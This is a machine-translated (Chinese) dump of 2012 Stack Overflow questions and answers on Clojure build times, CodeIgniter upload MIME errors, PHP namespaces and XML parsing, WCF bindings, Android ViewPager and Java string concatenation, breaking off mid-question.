我有一个依赖于几个 Clojure 库的 Clojure “主”应用程序，其中两个是我的。编译阶段，无论是编译还是运行uberjar都需要很长时间。它至少需要一分钟或更长时间。我的图书馆和主要图书馆都不是很大。

我的库和主 project.clj 文件包含

```
 :aot [bene-cmp.core]
  :omit-source true 
```

指令。

如果有的话，我可以做些什么来加快构建过程？

这是三个 project.clj 文件。项目.clj 主要

```
;$Log$
;
(defproject bene-cmp "1.0.0-SNAPSHOT"
  :description "This is the main benetrak/GIC comparison program."
  :dependencies [[org.clojure/clojure "1.3.0"]
                 [org.clojure/tools.cli "0.1.0"]
                 [clojure-csv/clojure-csv "1.2.4"]
                 [seesaw "1.4.0"]
                 [bene-csv "1.0.0-SNAPSHOT"]
                 [util "1.0.0-SNAPSHOT"]]
  :aot [bene-cmp.core]
  :omit-source true
  :main bene-cmp.core) 
```

project.clj 库 1

```
(defproject util "1.0.0-SNAPSHOT"
    ;$Log: project.clj,v $
    ;Revision 1.3  2012/04/04 18:24:36  cvsuser
    ;Take II on comments. (comment ) does not work.
    ;
    ;Revision 1.2  2012/04/04 18:20:54  cvsuser
    ;New library for Clojure. Add CVS comments.

  :description "A general purposes Clojure library"
  :dependencies [[org.clojure/clojure "1.3.0"]
                 [org.clojure/tools.cli "0.1.0"]]
  :aot [util.core]
  :omit-source true) 
```

项目.clj 库 2

```
(defproject bene-csv "1.0.0-SNAPSHOT"
  ;$Log: project.clj,v $
  ;Revision 1.2  2012/04/05 22:50:24  cvsuser
  ;Update and add cvs logging.
  ;
  :description "A csv parsing library"
  :dependencies [[org.clojure/clojure "1.3.0"]
                 [clojure-csv/clojure-csv "1.3.2"]
                 [util "1.0.0-SNAPSHOT"]]
  :aot [bene-csv.core]
  :omit-source true) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T08:03:10.050

将 jvm 选项 -Xmx 设置为 2G 或更高。

# iphone - iPhone超大上传的烦恼

> ID：10078883
> 
> 赞同：0
> 
> 时间：2012-04-09T19:49:55.687
> 
> 标签：iphone, networking, upload

我有一个应用程序可以设置用户照片的样式，然后保存和/或上传到 Facebook 等。

我的用户问他们是否可以一键保存/上传到多个服务。所以我实现了一个对话框，让他们选择要上传的服务，一旦你按下按钮，它就会一次上传到每个服务。

我担心的是，如果用户选择了 4 项服务并拥有完整的分辨率照片，那么所有这些数据可能需要相当长的时间才能通过 wi-fi 管道传输，更不用说 3G 了。

除了放置一个 UIActivityIndi​​cator 并告诉用户他的照片要去哪里......还有什么我应该做的......然后等待？就是让我心烦，他们能坐在那里很久，等着网络大神们……

有什么想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:24:14.980

使上传异步和后台（使用您正在使用的任何 3rd 方库 - 等待您不尝试使用 AFNetworking 或其他方式执行此操作，是吗？），然后使用任务完成 API 确保上传成功完成即使他们离开了应用程序。

我也会继续缩小图像的比例。如果他们要在网站上查看它，则不需要它是完整的数兆字节。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:57:19.350

添加一个显示字符串“Uploading to Facebook....”然后将其更改为“Uploading to Flickr....”等不会有什么坏处。如果你让你的应用程序看起来有多快，你会感到惊讶用户知道发生了什么事。（您也可以使用进度指示器。）

# asp.net-mvc - aspx.net 用户控件的弹出窗口

> ID：10078884
> 
> 赞同：0
> 
> 时间：2012-04-09T19:49:56.440
> 
> 标签：asp.net-mvc, jquery

我在我的 aspx 页面中使用了两个用户控制的 asp.net。我的一个用户控件中有一个 if 条件，我正在做出决定，这是我想要打开一个弹出窗口的决定的基础。任何帮助都会沉淀下来。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T20:21:28.687

```
 <asp:Button ID="Button1" runat="server" Text="Show PopUp" onclick="Button1_Click" />
</ContentTemplate>
    </asp:UpdatePanel>

    protected void Button1_Click(object sender, EventArgs e)
    {
        ModalPopupExtender1.Show();
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T15:57:26.780

我找到了答案。

RegisterStartupScript 或 RegisterClientScriptBlock 方法。

http://msdn.microsoft.com/en-us/library/z9h4dk8y.aspx[^]

http://msdn.microsoft.com/en-us/library/btf44dc9.aspx[^]

我使用了 registerClinetScriptBlock 方法及其工作。

# php - CodeIgniter "您尝试上传的文件类型不被允许。"

> ID：10078885
> 
> 赞同：6
> 
> 时间：2012-04-09T19:50:00.653
> 
> 标签：php, codeigniter, mime-types, image-uploading

我搜索了很多，发现了很多关于这个问题的问题，不幸的是没有一个答案对我有帮助。

我正在尝试上传 png 图像，但收到以下错误：

> 不允许您尝试上传的文件类型。

我按照这个 CI 指南来构建我的代码：[http ://codeigniter.com/user_guide/libraries/file_uploading.html](http://codeigniter.com/user_guide/libraries/file_uploading.html)

这是我得到的：

查看文件：

```
[..]
   <?= form_open_multipart() ?>
   <input type="file" name="userfile" size="20" />
   <br /><br />
   <input type="submit" value="upload" />
   <?= form_close() ?>
[..] 
```

我的控制器：

```
 $config['upload_path']   = './uploads/';
    $config['allowed_types'] = 'gif|jpg|png';
    $config['max_size']      = '100';
    $config['max_width']     = '1024';
    $config['max_height']    = '768';

        $this->load->library('upload', $config);

        $xx = array('upload_data' => $this->upload->data());
        $mimetype= $xx['upload_data']['file_type'];

        var_dump('Mime: ' . $mimetype);
        var_dump($_FILES);

        if ( !$this->upload->do_upload())
        {
            Notice::add($this->upload->display_errors(), 'error');
        }
        else
        {
            $data['upload_data'] = $this->upload->data();
        } 
```

如您所见，我正在尝试`var_dump`使用 mime 类型，结果为空。

当我这样做`var_dump($_FILES)`时，看起来一切都很好：

```
array(1) { ["userfile"]=> array(5) { ["name"]=> string(14) "imageofm.png" ["type"]=> string(9) "image/png" ["tmp_name"]=> string(18) "/var/tmp/php5cDAZJ" ["error"]=> int(0) ["size"]=> int(358) } } 
```

另外，我`'png' => array('image/png', 'image/x-png'),`在我的`config/mimes.php`.

但是，它确实发生在所有图像上（还没有尝试过其他扩展）。

我将不胜感激每一次帮助尝试。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-07-22T15:22:17.630

只需编辑*application/config/mimes.php中的**mimes.php*文件，并将*csv*的行替换为此：

 **```
'csv' => array('application/vnd.ms-excel', 'text/anytext', 'text/plain', 'text/x-comma-separated-values', 'text/comma-separated-values', 'application/octet-stream', 'application/vnd.ms-excel', 'application/x-csv', 'text/x-csv', 'text/csv', 'application/csv', 'application/excel', 'application/vnd.msexcel') 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-12-27T10:45:23.033

将 'text/plain' 添加到 config/mimes.php 中的 CSV 数组到 $mimes 数组

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-01T13:09:43.103

用 2.1.2 版本的 upload.php 库替换 codeigniter 2.1.0 system/libraries/upload.php 解决了这个问题。希望这可以帮助

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-07-22T15:46:20.747

```
$this->load->library('upload');  

$this->upload->set_allowed_types('*'); 

class MY_Upload extends CI_Upload {  

    function is_allowed_filetype() {  

        if (count($this->allowed_types) == 0 OR ! is_array($this->allowed_types))  
        {  
            $this->set_error('upload_no_file_types');  
            return FALSE;  
        }  

        if (in_array("*", $this->allowed_types))  
        {  
            return TRUE;  
        }  

        $image_types = array('gif', 'jpg', 'jpeg', 'png', 'jpe');  

        foreach ($this->allowed_types as $val)  
        {  
            $mime = $this->mimes_types(strtolower($val));  

            // Images get some additional checks  
            if (in_array($val, $image_types))  
            {  
                if (getimagesize($this->file_temp) === FALSE)  
                {  
                    return FALSE;  
                }  
            }  

            if (is_array($mime))  
            {  
                if (in_array($this->file_type, $mime, TRUE))  
                {  
                    return TRUE;  
                }  
            }  
            else  
            {  
                if ($mime == $this->file_type)  
                {  
                    return TRUE;  
                }  
            }  
        }  

        return FALSE;  

    }  

} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-10T09:51:14.313

`extension=php_fileinfo.dll`另一种解决方案是在**php.ini**中启用

 *** * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-08-15T22:49:36.067

我只是在第 34 行的 mime.php 中添加了这一行，现在 pptx 正在上传。在真实服务器上测试它

> 'pptx' => 数组('application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/zip'),

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-07-05T09:47:04.330

实际上，就我而言，我通过`void canvas.toBlob(callback, mimeType, qualityArgument)`方法从画布创建了一个 blob 对象所以 blob 文件没有其真实名称（具有扩展名），它只是“blob”。所以我必须使用传统方式上传文件，而不是“上传”库：

```
move_uploaded_file ( $file["tmp_name"], $target_file ) 
```****

# c# - 使 wsHttpBinding 替代 netTcpBinding 的场景是什么

> ID：10078889
> 
> 赞同：3
> 
> 时间：2012-04-09T19:50:15.160
> 
> 标签：c#, wcf, https, nettcpbinding, wshttpbinding

我们在 asp.net webforms Intranet 应用程序中使用 netTcpBinding。

在客户端机器上，我们正在运行 activeX (winforms)，它通过 wcf 检索其数据。

activeX 容器位于 asp.net 应用程序中。

使用 wsHttpBinding 而不是 netTcpBinding 我们有什么优势/好处？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:56:03.160

使用 wsHttpBinding 的主要好处是您可以将 WCF 服务器嵌入 IIS，然后使用 IIS 加密客户端和服务器之间的传输。它还允许您避免防火墙问题并使用端口 80 与服务器通信。

# php - json_encode 适用于开发，但不适用于我的产品服务器

> ID：10078891
> 
> 赞同：0
> 
> 时间：2012-04-09T19:50:15.660
> 
> 标签：php, javascript, json

我不知道要修复它。谢谢。

json_encode 适用于开发环境，但不适用于我的产品服务器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T16:01:40.933

`json_encode`/`json_decode`在您的生产服务器版本的 PHP (5.1.6) 中不可用。升级到 5.2 或更高版本。

# php - 未包含在命名空间中的 PHP 命名空间和引用类

> ID：10078892
> 
> 赞同：2
> 
> 时间：2012-04-09T19:50:17.053
> 
> 标签：php

我有一个简单的问题，希望有一个快速的答案。我编写的代码大量使用了命名空间（我在任何地方都使用完全限定名称）；但是，需要包含一段代码（日历/日期选择器控件，不是我自己编写的）。当我尝试创建控件时，它假定当前命名空间（GUI），导致此错误：“PHP 致命错误：在 C:\inetpub\wwwroot\Calico\calico_classes_v2.php 中找不到类 'GUI\tc_calendar' 在线1852”。现在，日历控件本身（以及它的底层类文件）不使用名称空间，我有点担心尝试修改它（早期的尝试并不顺利）。

如何将不包含在命名空间中的控件导入/包含到我的其余代码中，这样做呢？PHP 是否有类似“从文件 AS \Calendar\Calendar 导入类日历”的内容？

**编辑：** 有关其他信息：我有一个名为“tc_calendar”的类，包含在一个名为“tc_calendar.php”的文件中。它不是任何命名空间的一部分。

在一个单独的文件中，我有几个类（Bitmap、CompositeCalendar、EventEditor、TimeExtractor），它们都包含在它们相应的命名空间（GUI、Data、Extract 等）中。

在 GUI 命名空间中包含的其中一个类 CompositeCalendar 中，我试图创建一个 tc_calendar 的实例。然而，PHP 抛出了一个错误（上图）。tc_calendar 不是任何 namspace 的一部分（绝对不是 GUI 命名空间的一部分，PHP 只是假设，因为它似乎找不到它），我需要帮助来创建它的实例。

tldr; $newcontrol = new tc_calendar() 不起作用；PHP 试图猜测它的命名空间（因为没有指定，因为 tc_calendar 不是任何命名空间的一部分），然后给出了 \GUI\tc_calendar （显然是错误的）。如何从命名空间内访问不包含在命名空间内的类？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:58:30.167

你的意思是这样的：

```
namespace GUI;

use \tc_calendar as Calendar;

$myCalendar = new Calendar(); 
```

`as Calendar`是可选的。`tc_calendar`如果您省略`as Calendar`.

## 更新

把它放在评论的形式：

```
namespace {
    class tc_calendar {} 
}
namespace GUI {
    use \tc_calendar;

    class CompositeCalendar { 
        private function blah() { 
             $control = new tc_calendar();   
             $control->stuff(); 
        } 
    }
} 
```

不过，我不会将粘贴外部库复制到同一个文件中。这是不好的做法。最好将它们保存在另一个文件中，然后包含它们并具有以下内容：

```
namespace GUI;

use \tc_calendar;

require_once 'tc_calendar.php';

class CompositeCalendar { 
        private function blah() { 
             $control = new tc_calendar();   
             $control->stuff(); 
        } 
} 
```

或者结合我的 3 个片段，让它拥有你喜欢的任何其他形式。

如果您只是基于以下内容构建日历类，我还建议您扩展日历`tc_calendar`：

```
namespace GUI;

use \tc_calendar;

require_once 'tc_calendar.php';

class CompositeCalendar extends tc_calendar { 
        private function blah() {  
             $this->stuff(); 
        } 
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T01:13:59.883

不在命名空间中的任何类都会自动在*全局*命名空间中。
要从任何地方引用全局命名空间中的任何内容，请使用单个前置`\`：

```
new \tc_calendar; 
```

# android - 片段之间的 Viewpager 传递包

> ID：10078894
> 
> 赞同：1
> 
> 时间：2012-04-09T19:50:23.300
> 
> 标签：android, fragment, android-viewpager

我有一个自定义 Viewpager，它在其中禁用了触摸事件。所以我有控制viewpager的按钮'Next'和'Back'。我的问题是如何在 viewpager 的片段之间传递数据或包。通常它会起作用，但即使没有显示片段，也会感觉到片段已创建。那是因为 viewpager 幻灯片效果，它必须使片段在前面和之前才能起作用。这意味着我不能使用包，因为片段已经创建。这就是我想要做的

片段 1 -> 片段 2 -> 片段 3

Fragment 1 已创建，Fragment 2 也已创建。当我按“Next”时，会显示 Fragment 2。当我再次按“下一步”时，我想将一个包传递给 Fragment 3，但 Fragment 3 已经创建，所以它不起作用。

我想到的另一种方法是当 Viewpager 将其设置为当前 Item 时，在每个 Fragment 中调用一个方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:30:00.827

为什么不创建一个所有片段都实现的接口？该接口将有两个方法：`getParameterData()`和`setParameterData()`。在您的 ViewPager 中，当他们按下下一个或上一个时，调用`getParameterData()`当前片段，然后调用`setParameterData()`要显示的片段。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T20:17:46.577

您可以通过将对象保存在主机活动中来在片段之间共享/传递您的对象。

# c# - 这种方法是验证业务对象的最佳方法吗

> ID：10078905
> 
> 赞同：1
> 
> 时间：2012-04-09T19:50:50.387
> 
> 标签：c#, asp.net, mvp, software-design, solid-principles

我编写了这段代码来验证我的业务规则，我想知道这是否是验证业务对象的最佳解决方案。这样我就可以学会对我的所有项目进行这样的验证。这个解决方案可能有很多关于软件设计最佳实践的严重问题。

```
public interface IRule
{
    bool Isvalid();
}
public class CategoryRule : IRule
{
    CategoryRepository _category;
    string _id, _name, _parent;

    public CategoryRule(string id, string name, string parent)
    {
        _id = id;
        _name = name;
        _parent = parent;
    }
    public object IsValid()
    {
        bool result = this.ValidateId();
        if (result)
            result = this.ValidateName();
        else
        {
            this.Message = "the id value is not correct.";
            return false;
        }
        if (result)
            result = this.ValidateParent();
        else
        {
            this.Message = "the name value is not correct.";
            return false;
        }
        if (result)
            return _category;
        else
        {
            this.Message = "the parent value is not correct.";
            return false;
        }

    }
    private bool ValidateId()
    {
        long id;
        if (long.TryParse(_id, out id))
            return true;
        _category.Id = id;
        return false;
    }
    private bool ValidateName()
    {
        if (!string.IsNullOrWhiteSpace(_name))
            return true;
        _category.Name = _name;
        return false;
    }
    private bool ValidateParent()
    {
        long parent;
        if (long.TryParse(_parent, out parent))
            return true;
        _category.Parent = parent;
        return false;
    }
    public string Message
    {
        get;
        private set;
    }
}
public class CategoryPresenter
{
    View _view;
    CategoryRepository _model;

    public void AddCategory()
    {
        CategoryRule rule = new CategoryRule(_view.Id, _view.Name, _view.Parent);
        object obj = rule.IsValid();
        if (obj.GetType() == typeof(bool))
            _view.ShowError(rule.Message);
        _model.Add(obj as CategoryRepository);
    }
} 
```

我将不胜感激有关如何编写此代码的任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:56:24.447

看一下[`IValidatableObject`](http://msdn.microsoft.com/en-us/library/system.componentmodel.dataannotations.ivalidatableobject.validate.aspx)界面。它的作用与您的`IRule`界面相同，只是它允许同时返回多个错误消息。

数据注释包中还内置了验证规则。例如，在编写 MVC 模型时，只需使用`[Required]`属性标记字段以使其自动要求为非空。手动执行验证，使用[`Validator`](http://msdn.microsoft.com/en-us/library/system.componentmodel.dataannotations.validator%28VS.100%29.aspx)辅助类。

# php - 如何从 XML 文件中提取所有标签及其子项？

> ID：10078909
> 
> 赞同：2
> 
> 时间：2012-04-09T19:51:09.100
> 
> 标签：php, xml, parsing, foreach, xml-parsing

XML 数据如下所示：

```
 <?xml version="1.0" encoding="UTF-8"?>
    <xmldata>
      <Orders>
        <OrderID>2119</OrderID>
        <AddressValidated>Y</AddressValidated>
        <Affiliate_Commissionable_Value>2.0000</Affiliate_Commissionable_Value>
        <AuthHash>d995fd9424fb99e80f58841a0ff2340f</AuthHash>
        <AVS />
        <BillingAddress1>122 27th West</BillingAddress1>
        <BillingAddress2>Floor 11</BillingAddress2>
        <BillingCity>New York</BillingCity>
        <BillingCompanyName />
        <BillingCountry>United States</BillingCountry>
        <BillingFaxNumber />
        <BillingFirstName>Dan</BillingFirstName>
        <BillingLastName>Test</BillingLastName>
        <BillingPhoneNumber>646456777</BillingPhoneNumber>
        <BillingPostalCode>10001</BillingPostalCode>
        <BillingState>NY</BillingState>
        <CardHoldersName />
        <CC_Last4 />
        <CreditCardAuthorizationDate>3/30/2012 11:52:00 AM</CreditCardAuthorizationDate>
        <CreditCardAuthorizationNumber>MANUAL</CreditCardAuthorizationNumber>
        <CreditCardTransactionID />
        <Customer_IPAddress>184.56.49.45</Customer_IPAddress>
        <CustomerID>19</CustomerID>
        <CVV2_Response />
        <GiftWrapNote />
        <IsAGift>N</IsAGift>
        <LastModBy>7</LastModBy>
        <LastModified>3/30/2012 1:39:00 PM</LastModified>
        <Locked>Y</Locked>
        <Order_Comments>Test sale - Don't process
    Ignore statuses on this order</Order_Comments>
        <Order_Entry_System>PHONE</Order_Entry_System>
        <OrderDate>3/30/2012 11:01:00 AM</OrderDate>
        <OrderNotes />
        <OrderStatus>Ready to Ship</OrderStatus>
        <PaymentAmount>8.1600</PaymentAmount>
        <PaymentMethodID>17</PaymentMethodID>
        <PONum />
        <Processed_AutoEvents>Y</Processed_AutoEvents>
        <SalesRep_CustomerID>7</SalesRep_CustomerID>
        <SalesTax1>0.1700</SalesTax1>
        <SalesTax2>0.0000</SalesTax2>
        <SalesTax3>0.0000</SalesTax3>
        <SalesTaxRate>0</SalesTaxRate>
        <SalesTaxRate1>0.08375</SalesTaxRate1>
        <SalesTaxRate2>0</SalesTaxRate2>
        <SalesTaxRate3>0</SalesTaxRate3>
        <ShipAddress1>123 27th West</ShipAddress1>
        <ShipAddress2>Floor 1</ShipAddress2>
        <ShipCity>New York</ShipCity>
        <ShipCompanyName />
        <ShipCountry>United States</ShipCountry>
        <ShipFaxNumber />
        <ShipFirstName>Dan</ShipFirstName>
        <ShipLastName>Test</ShipLastName>
        <ShipPhoneNumber>646782342</ShipPhoneNumber>
        <Shipping_Locked>Y</Shipping_Locked>
        <ShippingMethodID>1</ShippingMethodID>
        <ShipPostalCode>10001</ShipPostalCode>
        <ShipResidential>Y</ShipResidential>
        <ShipState>NY</ShipState>
        <Stock_Priority>3</Stock_Priority>
        <Tax1_IgnoreNoTaxRules />
        <Tax1_Title>Tax (8.375%)</Tax1_Title>
        <Tax2_IgnoreNoTaxRules />
        <Tax2_IncludePrevious>0</Tax2_IncludePrevious>
        <Tax2_Title />
        <Tax3_IgnoreNoTaxRules />
        <Tax3_IncludePrevious>0</Tax3_IncludePrevious>
        <Tax3_Title />
        <Total_Payment_Authorized>0.0000</Total_Payment_Authorized>
        <Total_Payment_Received>7.0700</Total_Payment_Received>
        <TotalShippingCost>5.9900</TotalShippingCost>
        <VendorID>0</VendorID>
        <OrderDetails>
          <OrderDetailID>3374</OrderDetailID>
          <AutoDropShip>Y</AutoDropShip>
          <FreeShippingItem>Y</FreeShippingItem>
          <GiftTrakNumber>0</GiftTrakNumber>
          <GiftWrap />
          <GiftWrapCost>0.0000</GiftWrapCost>
          <GiftWrapNote />
          <IsKitID />
          <KitID />
          <Locked>Y</Locked>
          <OnOrder_Qty>0</OnOrder_Qty>
          <OptionIDs />
          <Options />
          <OrderID>2119</OrderID>
          <ProductCode>test-product</ProductCode>
          <ProductID>39200</ProductID>
          <ProductName>Test Product 1</ProductName>
          <ProductNote />
          <ProductPrice>1.0000</ProductPrice>
          <ProductWeight>1</ProductWeight>
          <QtyOnBackOrder>0</QtyOnBackOrder>
          <QtyOnHold>1</QtyOnHold>
          <QtyShipped>0</QtyShipped>
          <Quantity>1</Quantity>
          <TaxableProduct>Y</TaxableProduct>
          <TotalPrice>1.0000</TotalPrice>
          <Vendor_Price>0.0000</Vendor_Price>
          <Warehouses />
        </OrderDetails>
        <OrderDetails>
          <OrderDetailID>3386</OrderDetailID>
          <AutoDropShip />
          <FreeShippingItem>Y</FreeShippingItem>
          <GiftTrakNumber>0</GiftTrakNumber>
          <GiftWrap />
          <GiftWrapCost>0.0000</GiftWrapCost>
          <GiftWrapNote />
          <Locked>Y</Locked>
          <OnOrder_Qty>0</OnOrder_Qty>
          <Options />
          <OrderID>2119</OrderID>
          <ProductCode>test-product</ProductCode>
          <ProductID>39200</ProductID>
          <ProductName>Test Product 2</ProductName>
          <ProductNote />
          <ProductPrice>1.0000</ProductPrice>
          <ProductWeight>1</ProductWeight>
          <QtyOnBackOrder>0</QtyOnBackOrder>
          <QtyOnHold>1</QtyOnHold>
          <QtyShipped>0</QtyShipped>
          <Quantity>1</Quantity>
          <TaxableProduct>Y</TaxableProduct>
          <TotalPrice>1.0000</TotalPrice>
        </OrderDetails>
      </Orders>
      <Orders>
        <OrderID>2141</OrderID>
        <AddressValidated>Y</AddressValidated>
        <Affiliate_Commissionable_Value>1.0000</Affiliate_Commissionable_Value>
        <AuthHash>14cca8be8db44ca9943f0a6cbf592c83</AuthHash>
        <AVS />
        <BillingAddress1>122 27th West2</BillingAddress1>
        <BillingAddress2 />
        <BillingCity>New York2</BillingCity>
        <BillingCompanyName />
        <BillingCountry>United States</BillingCountry>
        <BillingFaxNumber />
        <BillingFirstName>Dan2</BillingFirstName>
        <BillingLastName>Test2</BillingLastName>
        <BillingPhoneNumber>646346322</BillingPhoneNumber>
        <BillingPostalCode>10002</BillingPostalCode>
        <BillingState>NY</BillingState>
        <CardHoldersName />
        <CC_Last4 />
        <CreditCardAuthorizationDate>3/30/2012 3:33:00 PM</CreditCardAuthorizationDate>
        <CreditCardAuthorizationNumber>MANUAL</CreditCardAuthorizationNumber>
        <CreditCardTransactionID />
        <Customer_IPAddress>56.75.23.34</Customer_IPAddress>
        <CustomerID>19</CustomerID>
        <CVV2_Response />
        <GiftWrapNote />
        <IsAGift>N</IsAGift>
        <LastModBy>7</LastModBy>
        <LastModified>3/30/2012 3:33:00 PM</LastModified>
        <Locked>Y</Locked>
        <Order_Comments>Test sale #2, don't process, ignore status.</Order_Comments>
        <Order_Entry_System>PHONE</Order_Entry_System>
        <OrderDate>3/30/2012 3:32:00 PM</OrderDate>
        <OrderNotes />
        <OrderStatus>Ready to Ship</OrderStatus>
        <PaymentAmount>7.0700</PaymentAmount>
        <PaymentMethodID>17</PaymentMethodID>
        <PONum />
        <Processed_AutoEvents>Y</Processed_AutoEvents>
        <SalesRep_CustomerID>7</SalesRep_CustomerID>
        <SalesTax1>0.0800</SalesTax1>
        <SalesTax2>0.0000</SalesTax2>
        <SalesTax3>0.0000</SalesTax3>
        <SalesTaxRate>0</SalesTaxRate>
        <SalesTaxRate1>0.08375</SalesTaxRate1>
        <SalesTaxRate2>0</SalesTaxRate2>
        <SalesTaxRate3>0</SalesTaxRate3>
        <ShipAddress1>123 27th West2</ShipAddress1>
        <ShipAddress2 />
        <ShipCity>New York2</ShipCity>
        <ShipCompanyName />
        <ShipCountry>United States</ShipCountry>
        <ShipFaxNumber />
        <ShipFirstName>Dan2</ShipFirstName>
        <ShipLastName>Test2</ShipLastName>
        <ShipPhoneNumber>6461234789</ShipPhoneNumber>
        <Shipping_Locked>Y</Shipping_Locked>
        <ShippingMethodID>1</ShippingMethodID>
        <ShipPostalCode>10002</ShipPostalCode>
        <ShipResidential>Y</ShipResidential>
        <ShipState>NY</ShipState>
        <Stock_Priority>3</Stock_Priority>
        <Tax1_IgnoreNoTaxRules />
        <Tax1_Title>Tax (8.375%)</Tax1_Title>
        <Tax2_IgnoreNoTaxRules />
        <Tax2_IncludePrevious>0</Tax2_IncludePrevious>
        <Tax2_Title />
        <Tax3_IgnoreNoTaxRules />
        <Tax3_IncludePrevious>0</Tax3_IncludePrevious>
        <Tax3_Title />
        <Total_Payment_Authorized>0.0000</Total_Payment_Authorized>
        <Total_Payment_Received>7.0700</Total_Payment_Received>
        <TotalShippingCost>5.9900</TotalShippingCost>
        <VendorID>0</VendorID>
<OrderDetails>
      <OrderDetailID>3404</OrderDetailID>
      <AutoDropShip>Y</AutoDropShip>
      <FreeShippingItem>Y</FreeShippingItem>
      <GiftTrakNumber>0</GiftTrakNumber>
      <GiftWrap />
      <GiftWrapCost>0.0000</GiftWrapCost>
      <GiftWrapNote />
      <IsKitID />
      <KitID />
      <Locked>Y</Locked>
      <OnOrder_Qty>0</OnOrder_Qty>
      <OptionIDs />
      <Options />
      <OrderID>2141</OrderID>
      <ProductCode>test-product</ProductCode>
      <ProductID>39200</ProductID>
      <ProductName>Test Product</ProductName>
      <ProductNote />
      <ProductPrice>1.0000</ProductPrice>
      <ProductWeight>1</ProductWeight>
      <QtyOnBackOrder>0</QtyOnBackOrder>
      <QtyOnHold>1</QtyOnHold>
      <QtyShipped>0</QtyShipped>
      <Quantity>1</Quantity>
      <TaxableProduct>Y</TaxableProduct>
      <TotalPrice>1.0000</TotalPrice>
      <Vendor_Price>0.0000</Vendor_Price>
      <Warehouses />
    </OrderDetails>
  </Orders>
</xmldata> 
```

我只需要所有人的孩子`<OrderDetails>`

在测试中，我尝试简单地回显所有数据，然后在获得这些数据后设置变量。

```
function processxmldetails() {
$filexml='vl_rts.xml';
if (file_exists($filexml)) {
$xml = simplexml_load_file($filexml);
foreach ($xml->Orders->OrderDetails->children() as $Orders) {
echo $Orders . '<br>';
}
//end foreach
}
} 
```

这只呼应了这一点：

```
3374
Y
Y
0

0.0000

Y
0

2119
test-product
39200
Test Product 1

1.0000
1
0
1
0
1
Y
1.0000
0.0000 
```

我需要每个都`<OrderDetails>`在它自己的变量中，所以我可以检查`<OrderDetailID>`它是哪个并相应地插入另一个数据库。

我怎样才能`<OrderDetail>`一个一个地调用这些标签，然后检查它们`<OrderDetailID>`是什么来执行任务，然后继续下一个`<OrderDetail>`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T11:24:33.403

你可以使用这个：

```
<?php
function processxmldetails() {
    $filexml = 'vl_rts.xml';
    $data = array();

    if( file_exists( $filexml ) ) {
        $xml = simplexml_load_file( $filexml );
        $i = 0;

        foreach( $xml->Orders as $key => $orders ) {
            $j = 0;
            $data[ $i ] = array();

            $data[ $i ][ 'OrderID' ] = ( int ) $orders->OrderID;
            $data[ $i ][ 'OrderDetails' ] = array();

            foreach( $orders->OrderDetails as $key1 => $value ) {
                foreach( $value as $k => $v ) {
                    $data[ $i ][ 'OrderDetails' ][$j][ $k ] = ( string ) $v;
                }
                $j++;
            }
            $i++;
        }
    }

    return $data;
}
$result = processxmldetails();

foreach( $result as $key => $value ) {
    foreach( $value[ 'OrderDetails' ] as $k => $v ) {
        foreach( $v as $k1 => $v1 ) {
            echo $k1 .' = ' . $v1 . '<br />';
        }
        echo '----<br /><br />----';
    }
}
?> 
```

标记内的所有数据`OrderDetailID`现在都在数组中。您可以根据自己的要求使用它。希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:56:06.847

好吧，因为我什么都不能假设这是我想出的
这是我们作为示例的 XML 文件

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
<to>Tove</to>
<from>Jani</from>
<heading>Reminder</heading>
<body>Don't forget me this weekend!</body>
</note> 
```

这是我们将用来提取信息的代码:)

```
$xml = simplexml_load_file("test.xml");

echo $xml->getName() . "<br />";

foreach($xml->children() as $child)
  {
  echo $child->getName() . ": " . $child . "<br />";
  } 
```

这将是我们的输出

```
note
to: Tove
from: Jani
heading: Reminder
body: Don't forget me this weekend! 
```

--旧代码--我知道这是错误的语言我的错误--
使用 get child，您可以从每个元素中提取您需要的信息

```
xml.getChild(index)
xml.getChild(path) 
```

[http://processing.org/reference/XMLElement_getChild_.html](http://processing.org/reference/XMLElement_getChild_.html)

祝你好运:)

# java - 最佳实践/性能：将 StringBuilder.append 与 String.concat 混合

> ID：10078912
> 
> 赞同：89
> 
> 时间：2012-04-09T19:51:20.557
> 
> 标签：java, string, stringbuilder, string-concatenation

我试图了解最佳实践是什么，以及为什么要针对不同情况连接字符串文字和变量。例如，如果我有这样的代码

```
StringBuilder sb = new StringBuilder("AAAAAAAAAAAAA")
    .append(B_String).append("CCCCCCCCCCC").append(D_String)
    .append("EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE")
    .append("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"); 
```

这是这样做的方法吗？从[这篇文章](https://stackoverflow.com/questions/47605/java-string-concatenation)中，我注意到`+`Strings 上的运算符创建了一个新的 StringBuilder 实例，连接操作数，并返回一个 String 转换，这似乎比调用要多得多`.append()`；所以如果这是真的，那是不可能的。但是呢`String.concat()`？是否适合`.append()`用于每个连接？或者仅用于变量，文字可以附加`.concat()`?

```
StringBuilder sb = new StringBuilder("AAAAAAAAAAAAA")
